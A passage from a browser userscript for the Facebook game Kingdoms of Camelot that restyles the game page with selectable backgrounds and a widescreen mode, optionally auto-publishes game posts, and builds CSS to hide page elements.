"url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/ruby-sundial.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground58") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/seamless-flower.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground59") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/straw-flowers.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground60") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/victorian-damask1.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground61") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/victorian-damask2.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground62") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/victorian-damask3.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground63") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/victorian-damask4.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground64") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/modern-warfare-3.gif')";
		break;
        }
       }
    }
     var e = document.getElementById('pageHead');
    if(e){
      e.style.width = '80%';
      e.style.margin = '0 10%';
    }
    var e = document.getElementById('bottomContent');
    if(e){
      e.style.padding = "0px 0px 12px 0px";
    }
    }
    facebookWatchdog();
    if (GlobalOptions.pbWideScreen)
       setWide();
  }
  function kabamStandAlone (){
  function setWide (){
	var iFrames = document.getElementsByTagName('IFRAME');
	if (!iFrames){ setTimeout (setWide, 1000);	  return;	}
	for(var f = 0; f<iFrames.length; f++){
		if(iFrames[f].src.match(/kingdomsofcamelot\.com\/fb\/.*?\/standAlone\.php/i)){iFrames[f].style.width = '100%';document.getElementById('content').style.width = '100%';}
		if(iFrames[f].src.match(/kingdomsofcamelot\.com\/fb\/.*?\/main_src\.php/i)){iFrames[f].style.width = '100%';}
	}
  }
  if (GlobalOptions.pbWideScreen)
    setWide();
}
 function HandlePublishPopup() {
    if(GlobalOptions.autoPublishGamePopups){
      var FBInputForm = document.getElementById('uiserver_form');
       if(FBInputForm){
         var channel_input = nHtml.FindByXPath(FBInputForm,".//input[contains(@name,'channel')]");
         if(channel_input){
           var current_channel_url = channel_input.value;
if (current_channel_url.match(/(http|https):\/\/.{0,100}kingdomsofcamelot\.com\/.*?\/cross_iframe\.htm/i) || current_channel_url.match(/kingdomsofcamelot.com/i)) {
          var publish_button = nHtml.FindByXPath(FBInputForm,".//input[@type='submit' and contains(@name,'publish')]");
            var privacy_setting = nHtml.FindByXPath(FBInputForm,".//select[@name='audience[0][value]']");
          if(publish_button && privacy_setting){
              privacy_setting.innerHTML = '<option value="'+ GlobalOptions.autoPublishPrivacySetting +'"></option>';
			  privacy_setting.selectedIndex = 0;
              nHtml.Click(publish_button);
          }
          }
      }
      }
      setTimeout(HandlePublishPopup, 1000);
    }
  }
/********************************************************************************
* 					KOC POWER - KSX BUTTLER 									*
*				the code is from ksx with some changes							*
*				 don't touch unasked (managed by ksx)							*
********************************************************************************/
if(!false) eval(GM_getResourceText( 'PLUGIN_BUTTLER' ));
/********************************************************************************
*						KOC POWER - PDXSTARTUP									*
********************************************************************************/
function pdxStartup (){
  defMode = {};
  clearTimeout (pdxStartupTimer);
  if (unsafeWindow.pdxLoaded)
  return;
  var metc = getClientCoords(document.getElementById('main_engagement_tabs'));
  if (metc.width==null || metc.width==0){
    pdxStartupTimer = setTimeout (pdxStartup, 1000);
    return;
  }
	unsafeWindow.pdxLoaded = true;
	KOCversion = anticd.getKOCversion();
	logit ("KOC version: "+ anticd.getKOCversion());

	Seed = unsafeWindow.seed;
	
	var styleBox = document.createElement('div'); 
	styleBox.innerHTML = '<div class=pdxStyleSel><center><table><tr><td style="background:none; border: none;"><a  title="'+culang.visitKoCPower+'" href='+userscriptURL+' target="_blank"><img  src="'+IMGksLogo+'"></a></td><td style="background:none; border: none; width:100%;"><div class=pdxVersions><font color='+Colors.pdxQuickInfoData+'><b>' + Version + '</b></font><center><div id=pdxLangFlag></div></center></div></td></tr></table></center><DIV id=pdxTimeInfos style="margin-top:-10px;"><table style="background:none; border:none;"><tr><td style="background:none; border:none;"><div id=pdxTime></div></td><td style="background:none; border:none;"><font color='+Colors.pdxQuickInfoData+'><span id=pdxTimeZone></span></font></td></tr></table></div><img title="'+culang.selStyleNow+'" height=18 width=18 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/theme.png> '+ htmlSelector({pdxBackground11:''+culang.kocscripts+'', pdxKoCOld: ''+culang.oldkocsty+'', pdxOwnBackground:''+culang.WPownBGopt+'', pdxOwnBackgrounddark:''+culang.WPownBGoptdark+'', pdxBackgroundColordark: ''+culang.WPbgcolordark+'', pdxBackgroundColor:''+culang.WPbgcolor+'', pdxBackground1:''+culang.WPfbblue+'', pdxBackground2:''+culang.WPfbworld+'', pdxBackground3:''+culang.WPubuntu+'', pdxBackground5:''+culang.WPStripes+'', pdxBackground6:''+culang.WPwebt+'', pdxBackground7:''+culang.WPdesign+'', 	pdxBackground8:''+culang.WPfblogo+'', pdxBackground9:''+culang.WPfblogobig+'', pdxBackground10:''+culang.WPmech+'', pdxBackground12:''+culang.WPtechno+'', pdxBackground13:''+culang.WPmetalplate+'', pdxBackground14:''+culang.WPmetalplateblue+'', pdxBackground15:''+culang.WPmetalplatesilver+'', pdxBackground16:''+culang.WPmetalplatesilver2+'', pdxBackground17:''+culang.WPmetalplatesilverdark+'', pdxBackground18:''+culang.WPmetalplatesilver3+'', pdxBackground19:''+culang.WPoldpaper3+'', pdxBackground20:''+culang.WPoldpaper+'', pdxBackground21:''+culang.WPpaperbackground1+'', pdxBackground22:''+culang.WPpaperbackground2+'', pdxBackground23:''+culang.WPcrumpledpaper2+'', pdxBackground24:''+culang.WPcrumpledpaper3+'', pdxBackground25:''+culang.WPcrumpledpaper+'', pdxBackground26:''+culang.WPlinetexture1+'', pdxBackground27:''+culang.WPlinetexture2+'', pdxBackground28:''+culang.WPlinetexture3+'', pdxBackground29:''+culang.WPlinetexture4+'', pdxBackground30:''+culang.WPlinetexture5+'', pdxBackground31:''+culang.WPlinetexture6+'', pdxBackground32:''+culang.WPlinetexture7+'', pdxBackground33:''+culang.WPlinetexture8+'', pdxBackground34:''+culang.wood+'', pdxBackground35:''+culang.WPwooddark+'', pdxBackground36:''+culang.wood+' 2', pdxBackground37:''+culang.WPleaf+'', pdxBackground38:''+culang.WPclouds+'', pdxBackground40:''+culang.WPattention+'', pdxBackground41:''+culang.WPdarkred+'', pdxBackground42:''+culang.WPdarkgray+'', pdxBackground43:''+culang.WPtech+'', pdxBackground44:''+culang.WPheart+'', pdxBackground45:''+culang.WPbutterflyblue+'', pdxBackground46:''+culang.WPblue+'', pdxBackground47:''+culang.WPsmoke+'', pdxBackground48:''+culang.WPabstraccolor+'', pdxBackground49:''+culang.WPabstracdark+'', pdxBackground50:''+culang.WPabstracgreen+'', pdxBackground51:''+culang.WPabstracgreen2+'', pdxBackground52:''+culang.WPabstracrosa+'', pdxBackground53:''+culang.WPbluedrop+'', pdxBackground54:''+culang.WPelectronicmonochro+'', pdxBackground55:''+culang.WPoctoredux+'', pdxBackground56:''+culang.WPpinkcheetah+'', pdxBackground57:''+culang.WPrubysundial+'', pdxBackground58:''+culang.WPseamlessflower+'', pdxBackground59:''+culang.WPstrawflowers+'', pdxBackground60:''+culang.WPvictoriandamask1+'', pdxBackground61:''+culang.WPvictoriandamask2+'', pdxBackground62:''+culang.WPvictoriandamask3+'', pdxBackground63:''+culang.WPvictoriandamask4+'', pdxBackground64:''+culang.WPmodernwarfare+'' },Options.pdxBackgroundStyle,'id=pdxStyleSelector') +'  </center><a title="'+culang.updLatest+'" href=http://userscripts.org/scripts/source/104137.user.js target="_blank"><img  height=18 width=18 src="'+IMGinstallLatest+'"></a></div>'; 
	document.getElementById('kocmain').parentNode.insertBefore(styleBox,document.getElementById('kocmain').nextSibling)

	var infoBox = document.createElement('div');
	infoBox.innerHTML = '<div class=pdxInfoBox>'+culang.pdxInfoBox+'</div>';
	document.getElementById('kocmain').parentNode.insertBefore(infoBox,document.getElementById('kocmain').nextSibling)

	document.getElementById('pdxStyleSelector').addEventListener ('change', function(){
         Options.pdxBackgroundStyle = document.getElementById('pdxStyleSelector').value;
         GM_setValue ('Options2_??', JSON2.stringify(Options));
		 saveOptions();
		 reloadKOC();
      },false);
/********************************************************************************
*						STYLE OPTIONS											*
********************************************************************************/
	if (Options.showMightKoCBugFix==true) var showMightKoCBugFix = '	#mainbody div#kochead.kocHeader div.taskbar div.rightColumn div.avatarInfo div.avatarStats div.avatarGlory { margin-left:30px; } .kocHeader .avatarStats .avatarLevel { padding-top:1px; left: -2px;  top: 35px;} .kocHeader .avatarMight, .kocHeader .avatarGlory {padding-left:1px;}';
	if (Options.showResKoCBugFix==true) var showResKoCBugFix = '.kocmain .mod_cityinfo #cityinfo_1 table .grw {left: 650px;    margin-top: 25px;    position: fixed;    text-align: right;    width: 60px;} .kocmain .mod_cityinfo #cityinfo_1 table tbody tr td {    background-color: transparent;    border-bottom: 1px solid transparent;}';
	if (Options.pdxLangFlag) { document.getElementById('pdxLangFlag').innerHTML = '<img height=18 width=17 src=http://koc-power-pdx.googlecode.com/svn/trunk/img/langflags/'+culang.langflag+'-24x24.png title="'+culang.pdxLangInfoNote+'">'; }
	if (Options.pdxTime) { document.getElementById('pdxTime').innerHTML = ''+getDateStrWithDOW()+''; }

	if (Options.hideKoCBar) var hideKoCButtons = '.topNav { display:none; height: 16px;padding: 0 0 0 20px; position: relative; top: 3px;}';
	if (Options.hideFriends) var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none; float: left; height: 100px;    position: relative;   width: 36px;} .kocmain .panel_friendlist .panel_list {display: none;  float: left;  height: 115px;  overflow-x: hidden;  position: relative;   width: 688px;} .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 307px; position: absolute;  top: -60px; width: 760px;}';
	if (Options.hideKoCHeader) var hideKoCHeader = '.kocHeader { display: none; background: none repeat scroll 0 0 transparent;  color: #FFFFFF;  height: 98px; width: 760px; }';

	// KOC SCRIPTS DESIGN show/hide KoC Stuff
	if (Options.hideFriends==true && Options.hideKoCBar==true && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none;} .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 437px; position: absolute;  top: -255px; width: 760px; height: 1px;} ';}
	if (Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==true && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; } .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 437px; position: absolute;  top: -255px; width: 760px; height: 1px;}';}
	if (Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==true && Options.hideShowKoCBottomStuff==true && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; } .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 306px; position: absolute;  top: -60px; width: 760px; height: 1px;} ';}
	if (Options.hideFriends==true && Options.hideKoCBar==true && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==true && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {display: none;} .kocmain .panel_friendlist .panel_list {display: none; } .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 437px; position: absolute;  top: -255px; width: 760px; height: 1px;} ';}
	if (Options.hideFriends==false && Options.hideKoCBar==true && Options.hideKoCHeader==false && Options.hideShowKoCBottomStuff==false && Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" || Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" ||  Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" ||  Options.pdxBackgroundStyle=="pdxBackground40" ||	Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" ||	Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
	var showHideFriendList = '.kocmain .panel_friendlist .panel_nav {float: left; height: 100px;    position: relative;    width: 36px;} .kocmain .panel_friendlist .panel_list { float: left;  height: 115px;  overflow-x: hidden;  position: relative;   width: 688px;} .kocmain .panel_friendlist { background: none repeat scroll 0 0 transparent;  left: 37px; position: absolute;  top: 1488px; width: 760px; height: 1px;}  ';}
